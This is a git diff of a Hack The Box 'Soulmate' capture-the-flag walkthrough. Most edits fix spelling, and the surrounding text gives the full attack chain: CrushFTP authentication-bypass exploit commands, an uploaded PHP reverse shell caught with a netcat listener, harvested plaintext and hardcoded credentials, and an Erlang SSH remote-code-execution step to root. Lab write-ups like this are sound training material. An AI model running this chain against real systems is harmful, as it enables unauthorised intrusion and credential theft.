@@ -3,6 +3,10 @@
 ## Recon
 
 ```
+nmap -A -p- -T4 10.129.4.153 -oN nmap_scan
+```
+
+```
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-26 22:45 IST
 Nmap scan report for 10.129.4.153
 Host is up (0.41s latency).
@@ -29,13 +33,13 @@ HOP RTT       ADDRESS
 2   360.73 ms 10.129.4.153
 ```
 
-- On visting the page we find the domain name soulmate.htb add it to /etc/hosts
+- On visiting the page, we find the domain name soulmate.htb. Add it to /etc/hosts.
 ```
 echo '10.129.231.23 soulmate.htb | sudo tee -a /etc/hosts'
 ```
-- The page is about finding youer solumate, I register accound and login to the site . 
-- The site using php for backend . and there is a file upload functionality . 
-- I tried lots of techniques but nothing worked . 
+- The page is about finding your soulmate. I registered an account and logged in to the site. 
+- The site using php for the backend. And there is a file upload functionality. 
+- I tried lots of techniques, but nothing worked. 
 - After a while i performed subdomain enumeration and found a sub.
 
 ```
@@ -72,22 +76,22 @@ ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 260
 echo '10.129.231.23 ftp.soulmate.htb' | sudo tee -a /etc/hosts
 ```
 
-- paste url in hte browser 
+- paste the URL in the browser 
 ```
 http://ftp.soulmate.htb
 ```
-- There we cn find a crushftp login page .
-- After googling it i found that the crushftp is vulnerable to authentication bypass. [CVE-2025-31161](https://www.sonicwall.com/blog/critical-crushftp-authentication-bypass-cve-2025-2825-exposes-servers-to-remote-attacks)
+- There, we can find a CrushFTP login page.
+- After googling, I found that CrushFTP is vulnerable to authentication bypass. [CVE-2025-31161](https://www.sonicwall.com/blog/critical-crushftp-authentication-bypass-cve-2025-2825-exposes-servers-to-remote-attacks)
 
-- And there is a python script avilable for this cve on [exploitDB](https://www.exploit-db.com/exploits/52295?source=post_page-----d39779c9ee1c---------------------------------------)
+- And there is a Python script available for this CVE on [exploitDB](https://www.exploit-db.com/exploits/52295?source=post_page-----d39779c9ee1c---------------------------------------)
 
-- you can check the version our crushftp form the source code 
+- You can check the version of our CrushFTP from the web page source code.
 ```
 .register("/WebInterface/new-ui/sw.js?v=11.W.657-2025_03_08_07_52")
 ```
 - version 11.W.657
 
-- lets check weather the application is vulnerable or not.
+- Let's check whether the application is vulnerable or not.
 
 ```
  python3 auth_bypass.py --target ftp.soulmate.htb --check --port 80
@@ -112,8 +116,8 @@ Total targets: 1
 Vulnerable targets: 1
 Exploited targets: 0
 ```
-- See it says vulnerable targets: 1
-- Exploiting the target
+- See, it says vulnerable targets: 1
+- Now Exploit the target
 ```
 python3 auth_bypass.py --target ftp.soulmate.htb --exploit --new-user spider --password password@123 --port 80
 
@@ -140,8 +144,8 @@ Total targets: 1
 Vulnerable targets: 0
 Exploited targets: 1
 ```
-- now we had addes a user of our own choice we can login using the credentials 
-- Well intially i created user spider and i logged in there i can find a admin interface . which menas we logged in as admin, then i tried access admin interface it didn't work dont know why. so i reset ppassword for the default admin **crushadmin**. and logged in 
+- Now that we have added a user of our own choice, we can log in using the credentials 
+- Well! intially i created a user spider, and I logged in. Then I find an admin interface. I tried to access the admin interface, but it didn't work don't know why. So I reset ppassword for the default admin **crushadmin**. and logged in. 
 ```
 python3 auth_bypass.py --target ftp.soulmate.htb --exploit --new-user crushadmin --password password@123 --port 80
 
@@ -168,8 +172,8 @@ Total targets: 1
 Vulnerable targets: 0
 Exploited targets: 1
 ```
-- after login in the admin panel we can see other users . i resent ben username password . 
-- Ha has access to webProd directory which is our http://soulmate.htb site . 
+- After logging in to the admin panel, we can see other users. I resent ben user's password. 
+- Ha has access to the webProd directory, which is our http://soulmate.htb site . 
 - I uploaded a php shell to that directory.
 
 ```
@@ -293,11 +297,12 @@ function printit ($string) {
 ```
 nc -lnvp 1234
 ```
-- After that access the page http://soulmate.htb/shell.php
-- Got shell as www-data
+- After that, access the URL http://soulmate.htb/shell.php
+- Bhoom! Got a shell as www-data
 
-- The i navigate to var/www/soulmate.htb ther i found config file from the config file i found a soulmate.db file 
-- In that file i find admin password hash.
+- I navigate to var/www/soulmate.htb there I find a config file.
+- From the config file, I find a soulmate.db file 
+- In that file, i find the  admin password hash.
 
 ```
 www-data@soulmate:~/soulmate.htb/data$ ls
@@ -316,7 +321,7 @@ sqlite>
 ```
 1|admin|$2y$12$u0AC6fpQu0MJt7uJ80tM.Oh4lEmCMgvBs3PwNNZIR7lor05ING3v2|1|Administrator|||||2025-08-10 13:00:08|2025-08-10 12:59:39
 ```
-- This nothing but the soulmate admin user. you can find the clear text password in the config file .
+- This is nothing but the soulmate admin user. You can find the clear-text password in the config file.
 ```
   if ($adminCheck->fetchColumn() == 0) {
             $adminPassword = password_hash('Crush4dmin990', PASSWORD_DEFAULT);
@@ -325,7 +330,7 @@ sqlite>
                 VALUES (?, ?, 1, 'Administrator')
 ```
 
-- On further enumeration i found couple of listening ports 
+- On further enumeration i found a couple of listening ports 
 ```
 www-data@soulmate:~/soulmate.htb/config$ netstat -alt
 Active Internet connections (servers and established)
@@ -342,7 +347,7 @@ tcp        0      0 localhost:epmd          0.0.0.0:*               LISTEN
 tcp        0      0 localhost:43275         0.0.0.0:*               LISTEN   
 ```
 
-- On port 2222 found a ssh service running
+- On port 2222, a ssh service is running
 ```
 www-data@soulmate:~/soulmate.htb/config$ nc localhost 2222
 SSH-2.0-Erlang/5.2.9
@@ -356,7 +361,7 @@ _dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_int
 /lib/erlang_login/start.escript
 www-data    3163  0.0  0.0   6828  2172 pts/0    S+   16:49   0:00 grep erlang
 ```
-- The script to run the service is located on **/usr/local/lib/erlang_login/start.escript**
+- The script for the service is located on **/usr/local/lib/erlang_login/start.escript**
 ```
 cat /usr/local/lib/erlang_login/start.escript
 #!/usr/bin/env escript
@@ -411,7 +416,8 @@ main(_) ->
     end.
 ```
 
-- Found hadcoded ssh creds for user ben.
+- Found hardcoded ssh creds for user Ben.
+- ssh to Ben.
 ```
 ben@soulmate.htb
 ```
@@ -422,8 +428,9 @@ ben@soulmate.htb
 - The service **SSH-2.0-Erlang/5.2.9** is vulnerable to [RCE](https://github.com/platsecurity/CVE-2025-32433/tree/main)
 - Read this [article](https://www.keysight.com/blogs/en/tech/nwvs/2025/05/23/cve-2025-32433-erlang-otp-ssh-server-rce)
 
-- The exploit i success and it write a file to root directory .
-- since i alredy have ssh creds of ben i loged in the ssh service on port 2222.
+- If the above exploit is successful, it writes a file to the root directory.
+- And it worked. We can find a file, lab.txt, under the root directory. which means the service is vulnerable.
+- since I already have ssh creds of ben i loged in to the ssh service on port 2222.
 
 ```
 ssh ben@localhost -p 2222
@@ -440,4 +447,4 @@ ssh ben@localhost -p 2222
 "76570d7d88a2b8e9b4f02b1c43a78404\n"
 ```
 
-**Root.txt: 76570d7d88a2b8e9b4f02b1c43a78404
+**Root.txt: 76570d7d88a2b8e9b4f02b1c43a78404**
